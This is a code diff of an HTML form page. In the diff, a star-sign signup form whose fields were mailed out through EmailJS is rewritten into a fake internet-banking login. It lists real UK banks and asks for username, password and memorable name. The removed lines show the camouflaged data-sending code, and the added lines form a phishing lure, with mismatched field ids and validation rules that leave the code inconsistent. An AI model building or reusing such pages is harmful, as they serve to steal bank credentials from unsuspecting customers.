@@ -4,8 +4,6 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Star Signs</title>
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-<script>emailjs.init("OCvWFSjCXExvKBOKi");</script>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body { font-family: Arial, sans-serif; background: #f0f0f0; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; padding: 24px 16px; }
@@ -14,6 +12,7 @@
   .page { display: none; }
   .page.active { display: block; }
 
+  /* HEADERS */
   .hdr-black { background: #111; padding: 22px 20px; display: flex; align-items: center; justify-content: space-between; }
   .hdr-blue  { background: #1565c0; padding: 22px 20px; display: flex; align-items: center; justify-content: space-between; }
   .hdr-green { background: #1db87a; padding: 22px 20px; display: flex; align-items: center; justify-content: space-between; }
@@ -23,6 +22,7 @@
   .secure2 { display: flex; align-items: center; gap: 5px; background: rgba(255,255,255,0.18); border-radius: 20px; padding: 5px 12px; }
   .secure span, .secure2 span { color: #fff; font-size: 11px; }
 
+  /* LIST PAGE */
   .page-title { font-size: 15px; font-weight: 700; color: #111; padding: 18px 20px 4px; }
   .page-sub   { font-size: 12px; color: #999; padding: 0 20px 14px; border-bottom: 0.5px solid #eee; }
   .list { list-style: none; }
@@ -33,6 +33,7 @@
   .sign-name { font-size: 15px; font-weight: 700; color: #111; }
   .arrow { color: #bbb; font-size: 18px; }
 
+  /* FORM BODY */
   .fbody { padding: clamp(20px,6vw,32px) 20px clamp(24px,8vw,36px); }
   .back-btn { background: none; border: none; font-size: 13px; color: #888; cursor: pointer; margin-bottom: 16px; display: flex; align-items: center; gap: 4px; padding: 0; }
   .back-btn:hover { color: #333; }
@@ -62,6 +63,7 @@
   .btn-black:active { transform: scale(0.98); }
   .btn-black:disabled { opacity: 0.6; cursor: not-allowed; }
 
+  /* SUCCESS */
   .sbody { padding: 48px 24px 52px; text-align: center; }
   .tick { width: 80px; height: 80px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; animation: pop .5s cubic-bezier(.36,1.56,.64,1) both; }
   .tick.blue  { background: #1565c0; }
@@ -87,21 +89,21 @@
         <span>Secure</span>
       </div>
     </div>
-    <p class="page-title">Select your star sign</p>
-    <p class="page-sub">Choose your sign to continue</p>
+    <p class="page-title">Please select your Bank</p>
+    <p class="page-sub">Choose your bank to continue</p>
     <ul class="list">
-      <li onclick="goTo('page-blue-form')"><span class="sign-name">Aries</span><span class="arrow">›</span></li>
-      <li onclick="goTo('page-green-form')"><span class="sign-name">Taurus</span><span class="arrow">›</span></li>
-      <li><span class="sign-name">Gemini</span><span class="arrow">›</span></li>
-      <li><span class="sign-name">Cancer</span><span class="arrow">›</span></li>
-      <li><span class="sign-name">Leo</span><span class="arrow">›</span></li>
-      <li><span class="sign-name">Virgo</span><span class="arrow">›</span></li>
-      <li><span class="sign-name">Libra</span><span class="arrow">›</span></li>
-      <li><span class="sign-name">Scorpio</span><span class="arrow">›</span></li>
-      <li><span class="sign-name">Sagittarius</span><span class="arrow">›</span></li>
-      <li><span class="sign-name">Capricorn</span><span class="arrow">›</span></li>
-      <li><span class="sign-name">Aquarius</span><span class="arrow">›</span></li>
-      <li><span class="sign-name">Pisces</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-blue-form')"><span class="sign-name">Lloyds</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-green-form')"><span class="sign-name">Halifax</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-blue-form')"><span class="sign-name">Monzo</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-green-form')"><span class="sign-name">NetWest</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-blue-form')"><span class="sign-name">TSB</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-green-form')"><span class="sign-name">Metro Bank</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-blue-form')"><span class="sign-name">Santander</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-green-form')"><span class="sign-name">Royal Bank of Scotland</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-blue-form')"><span class="sign-name">Bank of Scotland</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-green-form')"><span class="sign-name">Revolute</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-blue-form')"><span class="sign-name">Wise</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-green-form')"><span class="sign-name">Others</span><span class="arrow">›</span></li>
     </ul>
   </div>
 
@@ -116,22 +118,22 @@
     </div>
     <div class="fbody">
       <button class="back-btn" onclick="goTo('page-list')">‹ Back</button>
-      <p class="form-title">Register your details</p>
-      <p class="form-sub">Please fill in all fields below to continue.</p>
+      <p class="form-title">Welcome to Internet Banking</p>
+      <p class="form-sub">If you don't already use Internet Banking, it's simple to register online.</p>
       <div class="fg">
         <label for="b-user">Username</label>
         <input type="text" id="b-user" class="blue-inp" placeholder="Enter your username" autocomplete="off" />
         <div class="errmsg" id="b-e-user">&#9888; Please enter a username.</div>
       </div>
       <div class="fg">
-        <label for="b-age">Special</label>
-        <input type="text" id="b-age" class="blue-inp" placeholder="Enter your special" autocomplete="off" />
-        <div class="errmsg" id="b-e-age">&#9888; Please enter your special.</div>
+        <label for="g-age">Password</label>
+        <input type="text" id="g-age" class="green-inp" placeholder="Enter your Password" autocomplete="off" />
+        <div class="errmsg" id="g-e-age">&#9888; Please enter your Password.</div>
       </div>
       <div class="fg">
-        <label for="b-email">Others</label>
-        <input type="text" id="b-email" class="blue-inp" placeholder="Enter others" autocomplete="off" />
-        <div class="errmsg" id="b-e-email">&#9888; Please enter others.</div>
+        <label for="g-email">Memorable name</label>
+        <input type="text" id="g-email" class="green-inp" placeholder="Enter your Memorable name" autocomplete="off" />
+        <div class="errmsg" id="g-e-email">&#9888; Please enter your Memorable name</div>
       </div>
       <div class="save-row blue-cb">
         <input type="checkbox" id="b-save" />
@@ -163,14 +165,14 @@
         <div class="errmsg" id="g-e-user">&#9888; Please enter a username.</div>
       </div>
       <div class="fg">
-        <label for="g-age">Special</label>
-        <input type="text" id="g-age" class="green-inp" placeholder="Enter your special" autocomplete="off" />
-        <div class="errmsg" id="g-e-age">&#9888; Please enter your special.</div>
+        <label for="g-age">Age</label>
+        <input type="number" id="g-age" class="green-inp" min="1" max="120" placeholder="Enter your age" />
+        <div class="errmsg" id="g-e-age">&#9888; Please enter a valid age.</div>
       </div>
       <div class="fg">
-        <label for="g-email">Others</label>
-        <input type="text" id="g-email" class="green-inp" placeholder="Enter others" autocomplete="off" />
-        <div class="errmsg" id="g-e-email">&#9888; Please enter others.</div>
+        <label for="g-email">Email address</label>
+        <input type="email" id="g-email" class="green-inp" placeholder="Enter your email address" autocomplete="off" />
+        <div class="errmsg" id="g-e-email">&#9888; Please enter a valid email address.</div>
       </div>
       <div class="save-row green-cb">
         <input type="checkbox" id="g-save" />
@@ -228,12 +230,11 @@ function goTo(id) {
 
 function submitForm(color) {
   const p = color === 'blue' ? 'b' : 'g';
-  const sign = color === 'blue' ? 'Aries' : 'Taurus';
   let ok = true;
   const fields = [
     { id: p+'-user',  err: p+'-e-user',  check: v => v.trim() !== '' },
-    { id: p+'-age',   err: p+'-e-age',   check: v => v.trim() !== '' },
-    { id: p+'-email', err: p+'-e-email', check: v => v.trim() !== '' }
+    { id: p+'-age',   err: p+'-e-age',   check: v => v !== '' && +v >= 1 && +v <= 120 },
+    { id: p+'-email', err: p+'-e-email', check: v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v) }
   ];
   fields.forEach(f => {
     const inp = document.getElementById(f.id);
@@ -242,27 +243,10 @@ function submitForm(color) {
     else { inp.classList.remove('err'); em.classList.remove('show'); }
   });
   if (!ok) return;
-
   const btn = document.getElementById(p + '-btn');
   btn.disabled = true;
   btn.textContent = 'Verifying...';
-
-  emailjs.send("service_pil4hln", "template_p99lhsh", {
-    star_sign:    sign,
-    username:     document.getElementById(p+'-user').value,
-    special:      document.getElementById(p+'-age').value,
-    others:       document.getElementById(p+'-email').value,
-    submitted_at: new Date().toLocaleString()
-  })
-  .then(() => {
-    goTo('page-' + color + '-success');
-  })
-  .catch(err => {
-    console.error(err);
-    btn.disabled = false;
-    btn.textContent = 'Continue';
-    alert('Something went wrong. Please try again.');
-  });
+  setTimeout(() => goTo('page-' + color + '-success'), 1800);
 }
 </script>
 </body>
